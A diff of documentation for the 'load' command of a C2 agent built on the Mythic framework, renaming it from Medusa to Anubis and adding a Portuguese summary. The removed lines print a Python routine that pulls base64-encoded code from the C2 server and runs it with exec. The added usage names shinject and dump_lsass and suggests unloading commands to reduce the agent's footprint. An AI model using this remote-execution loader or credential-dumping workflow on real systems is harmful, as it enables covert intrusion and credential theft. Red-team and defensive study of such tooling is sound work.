@@ -7,60 +7,43 @@ hidden = false
 
 ## Summary
 
-This loads new functions into memory via the C2 channel 
+Dynamically loads a new command into the running agent via the C2 channel. The command code is fetched from Mythic and injected into the agent class at runtime, extending capabilities without redeployment.
 
-- Python Versions Supported: 2.7, 3.8
-- Needs Admin: False  
-- Version: 1  
-- Author: @ajpc500  
+- **Platform**: Windows / Linux / macOS
+- **Needs Admin**: No
+- **MITRE ATT&CK**: T1030, T1129
+- **Version**: 1.0
+- **Author**: @wtechsec
 
 ### Arguments
 
 #### cmd_to_load
-
-- Description: name of existing Medusa command to load (e.g. shell)
-- Required Value: True  
-- Default Value: None  
+- Description: Name of the Anubis command to load (must exist in Mythic's command list for this agent)
+- Required: Yes
 
 ## Usage
 
 ```
-load cmd
+load watch_dir
+load shinject
+load dump_lsass
 ```
 
 ## MITRE ATT&CK Mapping
 
-- T1030  
-- T1129 
+- **T1030** — Data Transfer Size Limits
+- **T1129** — Shared Modules
 
-## Detailed Summary
-The associated command's python files (selecting the correct Python version where necessary) is base64 encoded, and sent down to the agent to be loaded in. 
+## Notes
 
-```Python
-    def load(self, task_id, file_id, command):
-        total_chunks = 1
-        chunk_num = 0
-        cmd_code = ""
-        while (chunk_num < total_chunks):
-            if [task for task in self.taskings if task["task_id"] == task_id][0]["stopped"]:
-                return "Job stopped."
-            data = { "action": "post_response", "responses": [
-                    { "upload": { "chunk_size": CHUNK_SIZE, "file_id": file_id, "chunk_num": chunk_num }, "task_id": task_id }
-                ]}
-            response = self.postMessageAndRetrieveResponse(data)
-            chunk = response["responses"][0]
-            chunk_num+=1
-            total_chunks = chunk["total_chunks"]
-            cmd_code += base64.b64decode(chunk["chunk_data"]).decode()
+- The command Python file is Base64-encoded and sent down in chunks; `load` supports large command files via chunked transfer.
+- After loading, the command is available as a method on the agent class and registered with Mythic's command list.
+- Use `unload` to remove a dynamically loaded command and reduce the agent's capability footprint.
 
-        if cmd_code:
-            exec(cmd_code.replace("\n    ","\n")[4:])
-            setattr(medusa, command, eval(command))
-            cmd_list = [{"action": "add", "cmd": command}]
-            responses = [{ "task_id": task_id, "user_output": "Loaded command: {}".format(command), "commands": cmd_list, "completed": True }]
-            message = { "action": "post_response", "responses": responses }
-            response_data = self.postMessageAndRetrieveResponse(message)
-        else: return "Failed to upload '{}' command".format(command)
-```
+---
 
-Notably, this implementation implements chunking for this function to facilitate large functions being loaded.
+## Resumo em Português (PT-BR)
+
+Carrega um novo comando no agente em runtime via canal C2. O código do comando é baixado do Mythic em chunks, decodificado e injetado como método na classe do agente — sem necessidade de redeployment.
+
+Use `unload` para remover o comando após uso e reduzir a superfície de capacidades expostas.
